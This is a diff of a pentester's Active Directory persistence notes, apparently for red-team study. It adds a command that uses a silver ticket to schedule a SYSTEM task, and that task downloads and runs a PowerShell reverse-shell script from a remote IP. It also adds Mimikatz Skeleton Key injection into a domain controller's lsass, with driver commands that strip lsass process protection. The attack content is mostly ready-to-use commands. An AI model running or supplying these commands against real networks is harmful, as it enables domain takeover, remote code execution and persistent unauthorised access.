@@ -1,6 +1,6 @@
 # AD - Domain Dominance / Persistence
 
-## Basics
+## asics
 
 * Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
 * Abusing trusts within domain, across domains and forests
@@ -95,8 +95,64 @@ Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /targ
 
 {% hint style="info" %}
 * Target is the host from where whe have the service account hash
-* Use cifs service for later access the filesystem of the Server
+* Using "cifs" service for later access the filesystem of the Server
+* Using "host" service allows to schedule tasks then on the target host
+* List of SPN which can be used: https://adsecurity.org/?page\_id=183&#x20;
 {% endhint %}
+
+**Schedudle an execute a task with silver ticket of "HOST" Service**
+
+schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke\_powerShellTcp.ps1''')'"
+
+schtasks /Run /S hostname.dom.local /TN "STCheck"
+
+{% hint style="info" %}
+* Attention: Within Download String these are two '
+* STCheck is the Name of the task you create
+{% endhint %}
+
+**List tasks**\
+****schtasks /S hostname.dom.local
+
+## 🦴Skeleton Key
+
+### Description
+
+* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
+* The regular Password and the new password will work
+* Malware named "Skeleton Key" used it
+* Not persistent after reboot/lsass process restart
+* You can access other machines, which authenticate to this DC
+* You can not patch lsass twice, reboot is required
+
+### Requirements
+
+* Needs DA rights
+
+### Tools
+
+**Inject a skeleton key, password will be mimikatz - DA rights required**\
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
+
+Now you can login e.g. with Enter-PSSession
+
+❓Debug really needed?
+
+{% hint style="info" %}
+If lsass runs as protected process/protected process light, skeleton key can still be used. We need to use the mimikatz driver (mimidriv.sys) on the disk of the target DC:
+
+mimikatz#privilege::debug\
+mimikatz# !+\
+mimikatz# !processprotect /process:lsass.exe /remove\
+mimikatz# misc::skeleton\
+mimikatz# !-
+
+Noisy in logs - Service Installation for a kernel mode driver will be displayed
+
+❓(Still work??) => This will install kernel mode driver
+{% endhint %}
+
+
 
 
 
